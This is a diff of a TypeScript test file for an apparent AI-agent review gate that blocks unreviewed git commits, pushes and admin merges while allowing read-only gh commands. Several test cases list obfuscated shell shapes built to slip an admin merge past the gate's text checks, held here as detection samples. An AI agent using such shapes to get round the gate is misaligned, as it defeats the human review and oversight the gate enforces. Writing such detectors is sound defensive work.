+    "for n in 1 2; do gh run download $n; done",
+    // (11) P2 — `${VAR}` is NOT a readable substitution. The doc claimed it was "left alone"; an
+    // UNQUOTED expansion also word-splits, so it can yield `git push`. Refused, and pinned so the
+    // doc and the code cannot drift apart again in the permissive direction.
+    "gh pr view ${R}/1",
+    "gh api repos/o/r/commits/${SHA}/check-runs",
+  ];
+  for (const cmd of writes) {
+    ok(!readsOnlyGhRead(cmd), `NOT a read (must keep the floor's decision): ${cmd}`);
+  }
+});
+
+testAsync("#2204: the evidence loops are ALLOWED end-to-end at 0 dispatches (and audited)", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      const { pi, fire } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        const loop = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "cd /tmp/x && for n in 2058 2172 1858; do echo \"=== $n ===\"; gh pr view \"$n\" --json title,body; done" },
+        });
+        equal(loop, undefined, "a `for` loop of `gh pr view` reads must be allowed with ZERO dispatches (#2204 evidence 1)");
+        const subst = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "for pr in 1863 1161; do sha=$(gh api repos/o/r/pulls/$pr --jq .head.sha); echo \"$pr $sha\"; done" },
+        });
+        equal(subst, undefined, "a `$(gh api …)` read must be allowed with ZERO dispatches (#2204 evidence 2)");
+        // Durable: the allow is recorded as a PASS with its reason, so the JSONL no longer shows
+        // `no_reviewers_dispatch` for a read and an operator can count what was allowed.
+        const passes = readAuditLines(auditLogPath()).filter((l) => l.event === "gate_pass");
+        equal(passes.length, 2, "both read allows are audited (one gate_pass each)");
+        equal(passes[0].reason, "read_only_no_dispatch", "the pass reason distinguishes a read from a dispatch");
+        equal(passes[0].extension, "review-enforcer", "…and is attributable to this gate");
+        ok(
+          String(passes[0].command).includes("gh pr view"),
+          "the pass records WHICH read was allowed (#1492's field, same shape)"
+        );
+        equal(
+          readAuditLines(auditLogPath()).filter((l) => l.event === "gate_block").length,
+          0,
+          "no gate_block was emitted for either read — the false positive is gone"
+        );
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: the floor STILL refuses writes at 0 dispatches — alone and bundled with a read", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      const { pi, fire } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        // THE TWO TESTS THAT MATTER MOST (#2148/#1379): a false PASS here would ship an
+        // unreviewed commit. `git commit` and `git push` at zero dispatches must block.
+        const commit = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
+        ok(commit && commit.block === true, "`git commit` at 0 dispatches must STILL be refused");
+        ok(commit.reason.includes("No reviewers were dispatched"), "…with the dispatch refusal, not a read pass");
+        const push = await fire("tool_call", { toolName: "bash", input: { command: "git push -u origin feat/x" } });
+        ok(push && push.block === true, "`git push` at 0 dispatches must STILL be refused");
+        // A read does NOT buy the refuser's silence for a write riding beside it: the candidate is
+        // the COMMAND, and a command that writes is a write.
+        const bundled = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "for n in 1863 1161; do gh pr view $n --json title; done && git push" },
+        });
+        ok(bundled && bundled.block === true, "a read bundled with a `git push` must STILL be refused");
+        const bundledCommit = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "sha=$(gh api repos/o/r/pulls/1 --jq .head.sha); git commit -m x" },
+        });
+        ok(bundledCommit && bundledCommit.block === true, "a `$(gh api …)` bundled with a `git commit` must STILL be refused");
+        // And the counts are the proof the two paths did not merge: three refusals, zero passes.
+        const audit = readAuditLines(auditLogPath());
+        equal(audit.filter((l) => l.event === "gate_block").length, 4, "every write refusal is audited");
+        equal(audit.filter((l) => l.event === "gate_pass").length, 0, "no read PASS was recorded for a write");
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: the refusal names the tier, names what to run instead, and delivers a once-only recovery", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      // `withCapturedConsole` keeps the factory's own logs out of the test output; the message we
+      // assert on is the returned `reason` (what the model reads as the tool result).
+      const { pi, fire, sent } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blocked && blocked.block === true, "still refused");
+        // (3) THE TIER IS NAMED, and `unlabeled` is explained rather than implied.
+        ok(/\n   → Tier: unlabeled — no tier marker was present/.test(blocked.reason), "the refusal names the tier and its provenance");
+        ok(blocked.reason.includes("NEVER DETERMINED"), "…and says an absent marker means no tier was determined (#2204)");
+        // (2) WHAT TO RUN INSTEAD: the reported shapes were reads, so the message hands over the
+        // shapes that need no reviewer — plus the retry instruction that makes the refusal
+        // survivable instead of terminal.
+        for (const needed of ["THIS REFUSAL IS NOT TERMINAL", "re-run the SAME command", "gh pr view <n>", "gh api <GET path>"]) {
+          ok(blocked.reason.includes(needed), `the refusal must include ${JSON.stringify(needed)} (#2204)`);
+        }
+        equal(blocked.terminate, false, "the blocked result must not be terminating (#2204)");
+        // The model-visible half: a followUp message (delivered when the agent has no more tool
+        // calls — the moment the run would otherwise end) that triggers a turn.
+        const recoveries = sent.filter((s) => s.message?.customType === "reviewer-block-recovery");
+        equal(recoveries.length, 1, "the recovery is delivered to the model exactly once");
+        equal(recoveries[0].options?.deliverAs, "followUp", "…as a followUp, i.e. at the moment the run would end");
+        equal(recoveries[0].options?.triggerTurn, true, "…and it triggers that turn instead of letting the run stop");
+        equal(recoveries[0].message?.content, blocked.reason, "…carrying the same instruction as the tool result");
+        // ONCE per session is the bound that keeps this from becoming a retry loop: a lane that
+        // keeps issuing refused commands buys ONE extra turn, not one per refusal.
+        const second = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(second && second.block === true, "the second refusal still blocks");
+        equal(
+          sent.filter((s) => s.message?.customType === "reviewer-block-recovery").length,
+          1,
+          "…and does NOT deliver a second recovery (no unbounded turn loop)"
+        );
+        const recoveryAudit = readAuditLines(auditLogPath()).filter(
+          (l) => l.event === "reviewer_preflight" && l.phase === "block_recovery"
+        );
+        equal(recoveryAudit.length, 1, "the delivery is audited once, with its phase");
+        // The audit must say what HAPPENED, not what was attempted (fresh review, P2): the first
+        // version wrote this record even when the host had no `sendMessage`, so the log claimed the
+        // model had been told when nothing was delivered — and the session's one recovery was spent.
+        equal(recoveryAudit[0].send_queued, true, "…and records that the message was handed to the SDK");
+        equal(recoveryAudit[0].tier_source, "undetermined", "…with the same provenance the block recorded (#2204 (3))");
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: a delivery that could not happen does NOT spend the session's one recovery", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      try {
+        // A host without `sendMessage` (an older SDK, or a test double): the gate must still refuse,
+        // must not throw, and must NOT record a delivery that never happened.
+        const handlers = new Map<string, Function[]>();
+        const pi = {
+          on: (ev: string, fn: Function) => {
+            const arr = handlers.get(ev) ?? [];
+            arr.push(fn);
+            handlers.set(ev, arr);
+          },
+        };
+        const fire = async (ev: string, event?: any): Promise<any> => {
+          const arr = handlers.get(ev) ?? [];
+          let last: any;
+          for (const fn of arr) last = await fn(event ?? {}, {});
+          return last;
+        };
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blocked && blocked.block === true, "the refusal still happens on a host with no sendMessage");
+        ok(blocked.reason.includes("THIS REFUSAL IS NOT TERMINAL"), "…and still carries the recovery text in the tool result");
+        const audit = readAuditLines(auditLogPath()).filter(
+          (l) => l.event === "reviewer_preflight" && l.phase === "block_recovery"
+        );
+        equal(audit.length, 1, "the attempt is still audited (an operator must be able to see it)");
+        equal(audit[0].send_queued, false, "…and says NOTHING was handed over");
+        // ⛔ THE NAME'S OTHER HALF — the recovery is NOT SPENT (fresh review, P2). Asserting only
+        // `send_queued === false` proves the attempt was recorded; it says nothing about the budget,
+        // and "the flag was set before the try" is exactly the regression that would survive it. So
+        // hand the SAME session a working `sendMessage` and block again: exactly one recovery must
+        // be delivered, which is only possible if the failed attempt did not consume it.
+        const sent: any[] = [];
+        (pi as any).sendMessage = (message: any, opts: any) => { sent.push({ message, opts }); };
+        const blockedAgain = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blockedAgain && blockedAgain.block === true, "the second refusal still blocks");
+        equal(
+          sent.filter((s) => s.message?.customType === "reviewer-block-recovery").length,
+          1,
+          "…and the session's one recovery is STILL delivered (the failed attempt did not spend it)"
+        );
+        const auditAfter = readAuditLines(auditLogPath()).filter(
+          (l) => l.event === "reviewer_preflight" && l.phase === "block_recovery"
+        );
+        equal(auditAfter.length, 2, "…and the successful hand-off is audited on its own row");
+        equal(auditAfter[1].send_queued, true, "…which is the row that says it was handed over");
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: a harness lane's recovery carries the HARNESS advice, not a dispatch order (#2148)", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      const prevKind = process.env.KIND;
+      process.env.PI_MODE = "print";
+      // `reviewerRoleFor()` runs at FACTORY LOAD, so the role must be set before the factory call.
+      process.env.KIND = "lane";
+      try {
+        const { pi, fire, sent } = mockPi();
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blocked && blocked.block === true, "a harness lane is still refused at 0 dispatches");
+        const recoveries = sent.filter((s) => s.message?.customType === "reviewer-block-recovery");
+        equal(recoveries.length, 1, "…and still gets the recovery");
+        // The tool result AND the model-visible message are the same text, and both are the HARNESS
+        // text: one path, one audience, no chance of the two drifting apart.
+        equal(recoveries[0].message?.content, blocked.reason, "the recovery is the same text as the tool result");
+        ok(/do NOT dispatch/i.test(blocked.reason), "a lane is told it does not dispatch (#2148)");
+        ok(/FINAL head/.test(blocked.reason), "…and what it DOES own (push its final head)");
+      } finally {
+        if (prevKind === undefined) delete process.env.KIND; else process.env.KIND = prevKind;
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+test("#2204: dispatchFloorMessage names EVERY tier, and `unknown` reads as UNDETERMINED", () => {
+  // The marker vocabulary (TIER_RULE) is the source, so a new key cannot be added without this
+  // test's matrix noticing that its message has no provenance clause.
+  for (const tier of Object.keys(TIER_RULE)) {
+    const label = tier === "unknown" ? "unlabeled" : tier;
+    const msg = dispatchFloorMessage(tier);
+    ok(msg.includes(`→ Tier: ${label} — `), `${tier} is named in its own refusal (as ${label})`);
+    ok(msg.includes("THIS REFUSAL IS NOT TERMINAL"), `${tier} refusal says it is not terminal (#2204)`);
+  }
+  // `unknown` is the pre-flight's literal for an UNLABELED issue: it must read as "nobody determined
+  // a tier", never as a tier of its own — the #2204 (3) complaint, one level up from the log.
+  const unknownMsg = dispatchFloorMessage("unknown");
+  ok(/\n   → Tier: unlabeled — the recorded value was `unknown`/.test(unknownMsg), "unknown maps to unlabeled + its provenance");
+  ok(unknownMsg.includes("UNDETERMINED"), "…and says UNDETERMINED, not 'stricter'");
+  ok(!unknownMsg.includes("Tier: unknown"), "`unknown` is never presented as a tier that was read");
+  // The vocabulary's own `unlabeled` key is UNDETERMINED too: a marker containing that word records
+  // that nobody determined a tier, so it must not report as `read` (cycle-2 review, P2).
+  const unlabeledLiteral = dispatchFloorMessage("unlabeled");
+  ok(/\n   → Tier: unlabeled — the recorded value was `unlabeled`/.test(unlabeledLiteral),
+     "a marker spelling `unlabeled` is reported as UNDETERMINED, not as a tier that was read");
+  equal(tierSourceFor("unlabeled"), "undetermined", "…and tierSourceFor agrees with the message");
+  equal(tierSourceFor("micro"), "read", "a real tier is `read`");
+  equal(tierSourceFor(""), "undetermined", "no marker is `undetermined`");
+  // The micro message is still the micro remediation (its skill skip is what makes it different) —
+  // the tier line is APPENDED, not substituted.
+  ok(dispatchFloorMessage("micro").startsWith(MICRO_BLOCK_MESSAGE), "micro keeps its own remediation");
+  ok(dispatchFloorMessage("standard").startsWith(BLOCK_MESSAGE), "standard keeps the generic remediation");
+  // The provenance table is exhaustive over the tier vocabulary: a new tier cannot ship without a
+  // declared provenance (and the per-tier assertions above then demand the message names it).
+  equal(
+    Object.keys(TIER_PROVENANCE).sort().join(","),
+    Object.keys(TIER_RULE).sort().join(","),
+    "every tier has a declared provenance, and no provenance names a tier that does not exist (#2204)"
+  );
+});
+
+test("#2204: the read allowlist cannot certify a MERGE — `pr` reads stay a subset of the non-merge register", () => {
+  // The escape sits at the ZERO-DISPATCH point, i.e. strictly downstream of the admin-merge and
+  // merge-registry gates, so a `gh pr <merge>` that reached it would already have been judged. That
+  // ordering is what makes the escape safe, and ordering is exactly what a later edit moves. The
+  // subset pin is the cheap invariant: `merge` is one keystroke from `view` in the same array, and
+  // this test fails in the unit suite instead of at merge time.
+  for (const sub of GH_READ_SUBCOMMANDS.pr) {
+    ok(
+      PR_NON_MERGE_SUBCOMMANDS.has(sub),
+      `gh pr ${sub} is certified a READ but is not on the non-merge register (${[...PR_NON_MERGE_SUBCOMMANDS].join("/")})`
+    );
+  }
+  for (const never of ["merge", "admin-merge", "checkout", "create"]) {
+    ok(
+      !GH_READ_SUBCOMMANDS.pr.includes(never),
+      `gh pr ${never} must never be a certified read — it writes or it is the verb the floor gates`
+    );
+  }
+  // The two verbs the floor exists for are not reachable through any read group's allowlist.
+  for (const [group, subs] of Object.entries(GH_READ_SUBCOMMANDS)) {
+    for (const never of ["merge", "create", "delete", "close", "edit", "comment"]) {
+      ok(!subs.includes(never), `gh ${group} ${never} must never be a certified read`);
+    }
+  }
+});
+
+test("#2204: the recovery advice is ROLE-AWARE — a harness lane is not told to dispatch (#2148)", () => {
+  // The recovery is delivered as a `followUp` that TRIGGERS A TURN, so telling a harness worker to
+  // dispatch a reviewer is #2148's contradiction with a keystroke attached: it wakes the lane up to
+  // do something its brief forbids and its toolset does not contain.
+  const self = dispatchFloorMessage("standard", "self");
+  ok(self.includes("dispatch a reviewer"), "a self-reviewing session IS told to dispatch");
+
+  const harness = dispatchFloorMessage("standard", "harness");
+  // Not "the word never appears": the needed hedge DOES mention it. What must not exist is an
+  // UNCONDITIONAL order — every dispatch instruction has to sit on the brief-overrides line.
+  for (const line of harness.split("\n")) {
+    if (/dispatch a reviewer/i.test(line)) {
+      ok(
+        /If your brief says/.test(line),
+        `the only dispatch instruction a harness lane sees is CONDITIONAL on its brief: ${line.trim()}`
+      );
+    }
+  }
+  ok(/do NOT dispatch/i.test(harness), "…and the default harness instruction is explicitly not to dispatch (#2148)");
+  for (const needed of ["do NOT dispatch", "do NOT merge", "THIS REFUSAL IS NOT TERMINAL", "FINAL head"]) {
+    ok(harness.includes(needed), `the harness recovery must include ${JSON.stringify(needed)}`);
+  }
+  // The hedge is what keeps a lane whose brief contradicts the KIND right: it may dispatch if its
+  // own brief says it owns the review.
+  ok(harness.includes("If your brief says you DO have a `task` tool"), "the harness line is not absolute");
+
+  const reviewer = dispatchFloorMessage("standard", "reviewer");
+  ok(!/dispatch a reviewer/i.test(reviewer), "the harness REVIEWER does not dispatch either");
+  for (const needed of ["do not dispatch", "report", "merge-one.sh"]) {
+    ok(reviewer.includes(needed), `the reviewer recovery must include ${JSON.stringify(needed)}`);
+  }
+  // The tier/provenance body is shared, so the role changes the ADVICE and nothing else.
+  for (const role of ["self", "harness", "reviewer"] as const) {
+    ok(
+      dispatchFloorMessage("standard", role).startsWith(BLOCK_MESSAGE),
+      `the ${role} recovery still carries the shipped remediation, not a replacement (${role})`
+    );
+  }
+  // Default is the self role: every existing caller keeps today's text.
+  equal(dispatchFloorMessage("standard"), self, "omitting the role keeps the self-reviewing text");
 });
 
 // ── #517 — BLOCK_MESSAGE repo-layout pin ─────────────
@@ -4070,7 +4811,11 @@ test("#485 T3: micro arm implements block (index.ts shape guard + region no-allo
   // co-drift to "warn" fails here even though T2 compares like-with-like).
   const tokens = [
     "// #485: uniform ≥1-dispatch block",
-    "reason: MICRO_BLOCK_MESSAGE",
+    // #2204: the micro arm returns the micro message through `dispatchFloorMessage`, which is what
+    // appends the tier line. The token moved with the shape; the ARM it pins (micro → micro
+    // remediation, never the generic one) is asserted behaviorally by T1, and the micro-vs-generic
+    // selection is re-pinned below so a message swap cannot hide behind the rename.
+    'return { block: true, reason: dispatchFloorMessage("micro", reviewerRole)',
     "export const TIER_RULE",
     'micro: "block"',
     'standard: "block"',
@@ -4096,14 +4841,21 @@ test("#485 T3: micro arm implements block (index.ts shape guard + region no-allo
   // must be NO `return undefined` (the pre-#485 warn-allow) — the only exits
   // are the micro block return and the generic block return below it.
   // The generic return is the file's FINAL `return { block: true, reason:
-  // BLOCK_MESSAGE }` (merge-gate paths return mergeGateBlockReason, not the
-  // BLOCK_MESSAGE constant): if a revert collapses the micro arm onto the
-  // generic return, a first-occurrence-after-microCheck anchor would bind to
-  // the micro arm's own copy and empty the region vacuously — the full-file
-  // lastIndexOf keeps the slice meaningful.
+  // dispatchFloorMessage(tier, reviewerRole) }` (merge-gate paths return mergeGateBlockReason, not the
+  // block-message builder; #2204 moved the tier line into that builder): if a revert collapses the
+  // micro arm onto the generic return, a first-occurrence-after-microCheck anchor would bind to
+  // the micro arm's own copy and empty the region vacuously — the full-file lastIndexOf keeps the
+  // slice meaningful.
   ok(microCheck !== -1, "micro arm must exist");
-  const genericReturn = src.lastIndexOf("return { block: true, reason: BLOCK_MESSAGE }");
+  const genericReturn = src.lastIndexOf("return { block: true, reason: dispatchFloorMessage(tier, reviewerRole)");
   ok(genericReturn !== -1 && genericReturn > microCheck, "generic block return must follow the micro arm");
+  // #2204: the tier line lives in ONE builder, and the micro arm must not bypass it (a hand-rolled
+  // return of MICRO_BLOCK_MESSAGE would silently drop the tier naming the issue asks for).
+  ok(
+    src.includes("export function dispatchFloorMessage(tier: string, role: ReviewerRole = \"self\"): string") &&
+      (src.match(/dispatchFloorMessage\("micro", reviewerRole\)/g) ?? []).length === 1,
+    "the micro arm routes its message through the shared builder (#2204)"
+  );
   const region = src.slice(microCheck, genericReturn);
   ok(!region.includes("return undefined"), "micro arm region must not contain a warn-allow return undefined (#485)");
   // Absence scan (closes the code-side re-drift hole the plan's Task 3 step 6
@@ -4391,19 +5143,22 @@ test("isAdminMergeCommand: the flag-shape fail-closed rules and their carve-outs
   ok(!isAdminMergeCommand('gh pr merge 999 -F "$tmpfile"'), "a dynamic --body-file is NOT the flag");
   ok(!isAdminMergeCommand('cd "$HOME/wt" && gh pr merge 7'), "a `$` BEFORE the merge word is not the flag");
   ok(!isAdminMergeCommand("gh pr view $X"), "a non-merge gh call with a `$VAR` is NOT gated");
-  // ⛔ THE FALSE POSITIVE THIS BRANCH STILL HAS (agent-infra#1776, measured
-  // 2026-10-15). `hasAdminMergeFlag` fires on a construct PLUS the word `admin`
-  // ANYWHERE — which a PR TITLE supplies — so these ordinary calls ARE read as
-  // admin merges here. That is asserted as TRUE, not fixed in place, because the
-  // predicate is the fail-closed TEXT layer, and making it precise is the scanner
-  // trap (#984): each attempt opened a fresh fail-open on the splice × repo-flag
-  // cross-product. The fix is in the CALLER, which declines the GUESS whenever the
-  // argv layer is present — `ghShimWillEnforce`, and the `tool_call` tests below.
+  // ⛔ THE FALSE POSITIVE THIS BRANCH USED TO HAVE (agent-infra#1776, measured
+  // 2026-10-15; FIXED for this class by #3953, 2026-10-27). `hasAdminMergeFlag` fires
+  // on a construct PLUS the word `admin` ANYWHERE — which a PR TITLE supplies — and the
+  // old guess arm then only asked whether the word `gh` appeared anywhere in the text,
+  // so these ordinary calls WERE read as admin merges. They are asserted FALSE now,
+  // because that arm asks for a merge VERB IN ARGV POSITION (`mergeInvocationInText`):
+  // a READABLE `gh pr create` / `gh issue comment` cannot merge anything, so no
+  // evidence gate should ever run on it. Deliberately narrowed here, in the predicate,
+  // rather than left to the CALLER's `ghShimWillEnforce` stand-down (#1776) — the
+  // stand-down is conditioned on the argv layer being installed, and this cell runs
+  // with it ABSENT, so the false block was live exactly where #3953 was reported.
   // The first command here is literally how agent-infra PR #1775 was blocked.
-  ok(isAdminMergeCommand('gh pr create --title "fix(admin-merge): x" --body-file "$(mktemp)"'),
-     "the text layer DOES mis-read a PR title mentioning admin — over-broad BY DESIGN");
-  ok(isAdminMergeCommand('gh issue comment 1 --body "the admin gate ran $(date)"'),
-     "…and likewise for any other gh call that mentions admin under a construct");
+  ok(!isAdminMergeCommand('gh pr create --title "fix(admin-merge): x" --body-file "$(mktemp)"'),
+     "a PR title mentioning admin is NOT a merge — the verb slot decides now (#3953)");
+  ok(!isAdminMergeCommand('gh issue comment 1 --body "the admin gate ran $(date)"'),
+     "…and neither is any other readable non-merge gh call that mentions admin");
   // The merge VERB is found in every spelling, including where a repo flag (whose
   // value may be a substitution or a quoted multi-word) sits exactly between the
   // verb words — these are the shapes the caller must NOT stand down for when the
@@ -4422,6 +5177,471 @@ test("isAdminMergeCommand: the flag-shape fail-closed rules and their carve-outs
      "…nor does a substituted repo value");
   ok(isAdminMergeCommand('V=--admin; gh pr --repo "$(cat .gh-repo)" merge 999 $V'),
      "…nor a QUOTED multi-word repo value");
+});
+
+// ── #3953 — a merge is an OPERATION IN ARGV POSITION, not a word in the text ──
+//
+// The defect: the candidate rule asked "is this an admin merge?" with "does the text
+// contain the word `gh`, or the words `pr` AND `merge`?" once a construct and the word
+// `admin` were present. Every read-only command that NAMED a merge therefore became a
+// merge it had to certify, and the refusal that resulted ("carries no readable admin merge
+// selector") landed on the exact `commits/<sha>/check-runs` read the fleet rules MANDATE
+// for answering "is the tree healthy".
+//
+section("#3953 — a READ-ONLY command that mentions merging is not a merge");
+
+test("mergeInvocationInText: read-only commands that NAME a merge are not candidates", () => {
+  // Each of these was REFUSED at 04bc1dde with "no resolvable PR number" (measured; see
+  // the module docstring on `mergeInvocationInText`), and each must stay admitted BY
+  // CONSTRUCTION — a property of the command SHAPE, not of the reader's mood.
+  const admitted: Array<[string, string]> = [
+    [
+      "the mandated check-runs read (the #3953 repro)",
+      `gh api "repos/daniel-ospina/tortoise/commits/abc123def456/check-runs?per_page=100&filter=all" --paginate --jq '.check_runs[] | [.id, .app.slug, .name, .status, .conclusion] | @tsv'`,
+    ],
+    [
+      "…the same read with a live head substitution, the way a lane writes it",
+      `git fetch origin main && S=$(git rev-parse origin/main) && gh api "repos/o/r/commits/$S/check-runs?per_page=100&filter=all" --paginate`,
+    ],
+    [
+      "a branch-protection projection: braces plus the word `enforce_admins`",
+      `gh api repos/o/r/branches/main/protection --jq '{enforce_admins: .enforce_admins, required: .required_status_checks}'`,
+    ],
+    [
+      "the ORIGINAL #3953 case: a `--search` argument naming the gate",
+      `gh issue list --repo daniel-ospina/tortoise --state all --search "review-enforcer admin-merge gate" --limit 6 --json number,state,title`,
+    ],
+    [
+      "a PR title mentioning admin on an ordinary `gh pr create` (#1775's shape)",
+      'gh pr create --title "fix(admin-merge): x" --body-file "$(mktemp)"',
+    ],
+    [
+      "a `gh pr revert` whose title mentions admin",
+      "gh pr revert 1234 --title 'Revert admin RBAC' --body $(cat msg.md)",
+    ],
+    [
+      "`git merge-base` — a read-only ancestry test",
+      "git merge-base --is-ancestor abc123 origin/main",
+    ],
+    [
+      "a pulls read projecting `merge_commit_sha`",
+      `gh api repos/o/r/pulls/12 --jq '.merge_commit_sha'`,
+    ],
+    [
+      "a log read plus a grep pattern naming the gate",
+      `gh run view 1 --log-failed 2>&1 | grep -viE "^\\s*$"`,
+    ],
+  ];
+  for (const [why, cmd] of admitted) {
+    ok(!mergeInvocationInText(cmd), `no merge verb in argv position → not a merge: ${why}`);
+    ok(!isAdminMergeCommand(cmd), `…so the admin-merge gate is never asked about it: ${why}`);
+  }
+  // The HISTORICAL REPRO, pinned even though it was already admitted here: the issue's
+  // canonical command must never regress. (It carries neither a construct nor the word
+  // `admin`, so it was fixed by earlier stand-down work, not by this change. Stated
+  // rather than implied, because a pin that passes with and without the fix is not a
+  // guard — it is a regression fence around the case the issue is about.)
+  ok(
+    !isAdminMergeCommand(
+      `gh api "repos/daniel-ospina/tortoise/commits/abc123def456/check-runs?per_page=100&filter=all" --paginate --jq '.check_runs[] | [.id, .app.slug, .name, .status, .conclusion] | @tsv'`,
+    ),
+    "the issue's own check-runs command is not a merge candidate (regression fence)",
+  );
+});
+
+test("mergeInvocationInText: every FAIL-CLOSED arm is load-bearing", () => {
+  // The narrowing must not turn into a fail-open. One representative per arm, each of
+  // which reaches gh as an admin merge while a narrower reader sees no verb at all:
+  const shapes: Array<[string, string]> = [
+    [
+      "arm 1 — the token walk reads the verb (a payload handed to a shell stays readable)",
+      "sh -c 'gh pr merge 999 --admin'",
+    ],
+    [
+      "arm 2 — the GROUP slot is a construct (`gh $V …`)",
+      'V="pr merge"; gh $V 999 --admin',
+    ],
+    [
+      "arm 2 — the group is out of reach behind a gh GLOBAL flag",
+      `gh --hostname github.com $X 999 $'--admin'`,
+    ],
+    [
+      "arm 3 — the verb assembled with append assignments (`CMD+=gh`)",
+      "PATH=/tmp/real:/usr/bin CMD+=gh CMD+=' ' CMD+=pr CMD+=' ' CMD+=merge CMD+=' ' CMD+=999 CMD+=' ' V+=--admin CMD+=$V;A+=ok $CMD;gh api /repos/o/r --body admin",
+    ],
+    [
+      "arm 3 — a quoted assignment prefix (`X='gh …'`), no token that IS `gh`",
+      "V=--admin; X='gh pr merge 999 $V'; sh -c \"$X\"",
+    ],
+    [
+      "arm 4 — the separators are ANSI-C escapes, so the token structure is unrecoverable",
+      `V=--admin; sh -c gh$'\\x20'pr$'\\x20'merge$'\\x20'999$'\\x20'$V`,
+    ],
+    [
+      "arm 5 — a QUOTED group word plus a construct in the verb slot (review cycle 1, P0)",
+      `M=merge; GH_TOKEN=abc gh "pr" $M 99900010 --admin`,
+    ],
+    [
+      "arm 5 — the same shape inside a reserved-word body, and behind a wrapper",
+      `if true; then gh "pr" m$'e'rge 99900010 --admin; fi`,
+    ],
+    [
+      "arm 5 — …and behind a wrapper",
+      `timeout 5 gh "pr" m$'e'rge 99900010 --admin`,
+    ],
+    [
+      "arm 3 — a SPLICED command word plus a quoted group word (review cycle 2, P0)",
+      `g$'h' "pr" merge 999 --admin`,
+    ],
+    [
+      "arm 3 — …behind a wrapper's arguments, where the position model stops",
+      `timeout 5 g$'h' "pr" merge 999 --admin`,
+    ],
+    [
+      "arm 3 — …and with the command word supplied entirely by the environment",
+      `$GH "pr" merge 999 --admin`,
+    ],
+  ];
+  for (const [why, cmd] of shapes) {
+    ok(mergeInvocationInText(cmd), `a merge invocation is still read (fail-closed): ${why}`);
+    ok(isAdminMergeCommand(cmd), `…and the admin-merge gate still decides it: ${why}`);
+  }
+  // And the arms do not over-fire on the shapes that made them necessary to bound:
+  ok(!mergeInvocationInText("echo ${X}"), "a bare `$` in an argument is not a command word");
+  ok(!mergeInvocationInText("bash ${RAIL} 999 --admin"),
+     "…so a rail path held in a variable does not become a merge candidate (#6395)");
+});
+
+test("mergeInvocationInText: a construct on BOTH sides is not an invocation (review cycle 3, P1)", () => {
+  // ⛔ THE OVER-BLOCK the cycle-2 fix introduced, and the reason arm 2 requires a READABLE
+  // `gh`: accepting a construct as the command word there turned "construct command + construct
+  // group" into the same vocabulary guess the predicate exists to replace. Every command below
+  // is READ-ONLY.
+  // ⛔ DECLARED AS REGRESSION FENCES, NOT GUARDS (measured in review cycle 5): `origin/main`
+  // ADMITS every row below (`isAdminMergeCommand` false, `isGitOp` false), so `!isAdminMergeCommand`
+  // holds there too and only the END-TO-END refusal differs. They are here because the INTERIM
+  // head (cycle 2's) refused them — that is the regression they fence — and NOT because the base
+  // did. Do not cite `evaluateAdminMergeGate(null, …)` as evidence for a row: with `pr === null` it
+  // returns `block`/`admin_no_pr` for ANY command, so it says nothing about these shapes (review
+  // cycle 5, P2). The first row is the script that verifies the evidence for THIS gate.
+  const overBlocks = [
+    `bash $AIR/scripts/verify-admin-merge-evidence.sh "$PR"`,
+    `$PY $SCRIPT --check-admin-policy`,
+    `$JQ "$F" --arg admin x`,
+    `$CARGO $ARGS --features admin`,
+    `"$PYTHON" "$SCRIPT" $'--dry-run'`,
+  ];
+  for (const cmd of overBlocks) {
+    ok(!mergeInvocationInText(cmd), `a read-only construct-construct command is not a merge: ${cmd}`);
+    ok(!isAdminMergeCommand(cmd), `…and the admin-merge gate is never asked about it: ${cmd}`);
+  }
+  // The narrowing must not cost the shapes arm 2 exists for: those all have a READABLE `gh`
+  // command word and an unreadable GROUP, which is the guess that pays for itself.
+  const stillRead = [
+    `gh $V 999 --admin`,
+    `gh --hostname github.com $X 999 --admin`,
+    `gh "pr" $M 99900010 --admin`,
+  ];
+  for (const cmd of stillRead) {
+    ok(mergeInvocationInText(cmd), `…while a readable \`gh\` with an unreadable group is still a merge: ${cmd}`);
+  }
+  // ⛔ And the DEFINITION the two arms share — "is there a word here that could BE `gh`" — pinned
+  // directly, because no command-shaped case in this file faults its two precision bounds:
